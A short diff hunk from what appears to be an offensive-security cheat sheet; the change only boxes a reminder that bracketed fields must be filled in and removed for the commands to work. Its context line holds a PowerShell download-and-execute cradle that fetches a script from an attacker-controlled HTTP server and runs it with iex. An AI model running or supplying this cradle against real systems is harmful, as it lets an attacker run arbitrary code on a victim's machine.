@@ -9,4 +9,6 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://[HTTP-SERVER-IP
 
 
 
-[Square Brackets] indicate changeable fields, tailor them to your use case.
+************************************************************************************************************************
+* [Square Brackets] indicate changeable fields, tailor them to your use case. Remove the brackets for this to function *
+************************************************************************************************************************
